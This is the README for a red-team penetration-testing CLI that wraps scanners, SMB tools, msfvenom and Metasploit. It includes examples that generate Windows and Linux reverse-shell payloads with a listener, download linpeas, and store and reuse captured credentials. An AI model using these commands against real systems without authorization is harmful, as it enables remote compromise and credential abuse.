# RedSploit

Red Team penetration testing CLI tool with interactive shell and automation capabilities.

## Features

- 🔧 **Interactive Shell** - Full-featured console with tab completion
- 🚀 **Quick CLI Mode** - Run commands directly from terminal
- 🎯 **Module System** - Infrastructure, Web, and File modules
- ⚡ **Shell Completion** - Native bash/zsh completion support
- 📝 **Variable Management** - Session-based environment variables
- ✨ **Post-Run Cleanup Summaries** - Optional AI-assisted summaries appended after supported scanner output

## Quick Start

### Installation

```bash
git clone https://github.com/Thongheng/RedSploit.git
cd RedSploit
./install.sh
```

This will:
- Install `red` to `/usr/bin` when run with `sudo`, or to `~/.local/bin/red` when run as a normal user
- Automatically set up shell completion and PATH updates when needed
- Ask once whether you want to configure AI-summary API keys
- Optionally configure AI-summary API keys for the installing user
- Make the tool accessible from anywhere

**Manual install (no sudo):**
```bash
chmod +x red.py
./red.py
```

### Configuration
RedSploit uses a `config.yaml` file located in the project root. It is automatically created on first run if missing.

For full setup instructions, including AI summary API keys and manual environment configuration, see [SETUP.md](./SETUP.md).

To verify both AI providers after setup:

```bash
./install.sh --test
```

### Wordlists
Configure default wordlist paths in `config.yaml` to match your system (e.g., if you are using macOS vs Kali).
```yaml
web:
  wordlists:
    directory: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    subdomain: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
    vhost: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
summary:
  enabled: true
  warn_on_unsupported: true
```

### Command History
Command history is automatically saved to `~/.redsploit_history`. You can recall commands from previous sessions using the Up Arrow key.

## Development
RedSploit is designed to be easily extensible. 

### Adding New Tools
Tools are defined in a data-driven structure within their respective module files (`infra.py`, `web.py`, `file.py`).

**Example (adding a tool to `INFRA_TOOLS`):**
```python
"my_tool": {
    "cmd": "mytool -t {target} --scan",
    "category": "My Category",
    "requires": ["target"]
}
```
The command template automatically injects variables like `{target}`, `{domain}`, `{url}`, and authenticates if `{auth}` is present.

### Usage

**Interactive Mode:**
```bash
red
# or with preset values
red -set -T 10.10.10.10
red -set target 10.10.10.10
```

**CLI Mode:**
```bash
red -T 10.10.10.10 -i -nmap -p
red -T https://example.com -w -gobuster --preview
red -w -headerscan https://example.com --detailed
red -f -download linpeas.sh -c
red -i -P 4444 -msfvenom -p
red -i -P 4444 -msf
```

**Command Flags:**

When running commands, you can use these flags to modify behavior:

| Flag | Description | Example |
|------|-------------|---------|
| `-c` / `--copy` | Copy command to clipboard without executing | `red -T 10.10.10.10 -w -dir_ferox -c` |
| `-p` / `--preview` | Preview the command without executing | `red -T 10.10.10.10 -i -nmap -p` |
| `-e` / `--edit` | Edit the command before execution | `red -T 10.10.10.10 -w -nuclei -e` |
| `-nosummary` / `--no-summary` | Disable the post-run summary section for this run | `red -T 10.10.10.10 -i -nmap --no-summary` |
| `-noauth` | Skip credentials for this run | `red -T 10.10.10.10 -U admin:pass -i -smbclient -noauth` |

**Set Variables:**
```bash
red -set -T 10.10.10.10      # Start interactive mode with target preset
red -set -U admin:pass       # Start interactive mode with credentials preset
red -set -D WORKGROUP        # Start interactive mode with domain preset
red -set -H <ntlm_hash>      # Start interactive mode with hash preset
```

## Available Modules

| Flag | Module | Description |
|------|--------|-------------|
| `-i` | infra | Infrastructure enumeration (nmap, rustscan) |
| `-w` | web | Web reconnaissance (gobuster, nuclei, etc.) |
| `-f` | file | File operations (download, upload, servers) |

## Variables

| Name | Description |
|------|-------------|
| `target` | Target IP/hostname/CIDR |
| `user` | User credentials (auto-splits on `:` to username and password) |
| `username` | Username (auto-set from user variable) |
| `password` | Password (auto-set from user variable) |
| `domain` | Domain name (default: .) |
| `hash` | NTLM hash (alternative to password) |
| `interface` | Network interface |
| `lhost` | Listener host override (used by Metasploit helpers) |
| `lport` | Local port for reverse shells (default: 4444) |
| `payload` | Payload name for Metasploit helpers |
| `payload_format` | Output format for `msfvenom` |
| `payload_file` | Output filename for generated payloads |
| `workspace` | Workspace name (default: default) |
| `summary` | Cleaner output mode (`on` or `off`) |

## AI Summaries

Supported scanner-style tools keep their original raw output and then append a `Summary` section at the end of the run. The first implementation covers:

- Infra: `nmap`, `rustscan`
- Web: `subfinder`, `dnsrecon`, `subzy`, `gobuster_dns`, `dir_ffuf`, `dir_ferox`, `dir_dirsearch`, `gobuster_dir`, `nuclei`, `waf`, `screenshots`

RedSploit uses this provider order for AI cleanup summaries:

1. OpenRouter (`OPENROUTER_API_KEY`)
2. ChatAnywhere (`CHATANYWHERE_API_KEY`)

If no provider is available or the request fails, the underlying tool output still succeeds and RedSploit falls back to a local summary when possible.

To disable the cleaner globally for the current session:

```bash
set summary off
```

## Credential Handling

RedSploit supports flexible credential management with automatic splitting and mode-based authentication:

**Auto-Split Credentials:**
```bash
# Set username and password in one command
red -set user admin:password123
# Automatically creates: username=admin, password=password123

# Or set username only
red -set user admin
```

**Mode-Based Authentication:**

- **CLI Mode**: Automatically uses credentials when available
  ```bash
  # With credentials - auto-applied
  red -T 10.10.10.10 -U admin:pass -i -smb-c
  
  # Without credentials - uses NULL session
  red -T 10.10.10.10 -i -smb-c
  ```

- **Interactive Mode**: set session values once, then run the tool
  ```bash
  > set target 10.10.10.10
  > set user admin:pass
  > use infra
  > smbclient
  > smbclient -noauth
  ```

## Loot Locker (Credential Management)

RedSploit includes a built-in **Loot Locker** to manage credentials found during engagements. It allows you to store, organize, and active credentials on the fly.

**Commands:**

- `loot add <content> [service] [type]`: Add new loot
- `loot show`: List captured loot
- `loot use <id>`: **Load loot into session variables** (sets user/password/hash)
- `loot rm <id>`: Remove loot

**Usage Example:**

```bash
# 1. Capture a credential
> loot add admin:Secret123 smb cred
[+] Added loot: admin:Secret123 (cred)

# 2. List available loot
> loot show
ID   Type       Target          Service    Content                                  
----------------------------------------------
1    cred                       smb        admin:Secret123                        

# 3. Use the credential (Populates session variables)
> loot use 1
[+] Loaded loot #1 into session variables.

# 4. Run tools with the loaded credential
> smbclient
```

> **Note**: The `service` and `target` fields in `loot add` are optional metadata to help you organize your loot. They do not restrict usage.

## Interactive Playbooks

Playbooks allow you to run semi-automated workflows defined in YAML files. This ensures consistency while keeping the operator in control (Human-in-the-loop).

**Commands:**

- `playbook list`: Show available playbooks
- `playbook run <name>`: Execute a playbook

**Example Workflow:**

```bash
> set target 10.10.10.10
> playbook run recon
```

Playbooks are stored in the `playbooks/` directory. You can create your own YAML files to define custom workflows.

## Examples

```bash
# Quick nmap scan
red -T 10.10.10.10 -i -nmap

# Web directory enumeration
red -T example.com -w -dir_ffuf

# Header security scan using the current session target
red -set target https://example.com
red -w -headerscan --json

# Header security scan for an explicit URL
red -w -headerscan https://example.com --detailed

# SMB enumeration with credentials (CLI auto-auth)
red -T 10.10.10.10 -U admin:pass -i -smb-c

# SMB enumeration without credentials (NULL session)
red -T 10.10.10.10 -i -smb-c

# Generate a payload that matches your handler
red -set payload windows/x64/shell_reverse_tcp
red -set lhost 10.10.14.7
red -set payload_file beacon.exe
red -i -msfvenom -p

# Start a matching Metasploit listener
red -set payload windows/x64/shell_reverse_tcp
red -set lhost 10.10.14.7
red -i -P 4444 -msf

# Interactive mode with credentials
red
> set target 10.10.10.10
> set user admin:password
> use infra
> smbclient        # Uses credentials automatically
> smbclient -noauth
> set payload linux/x64/shell_reverse_tcp
> set payload_file shell.elf
> msfvenom -p
> msf
> back
> use web
> headerscan --json
```

## License

MIT
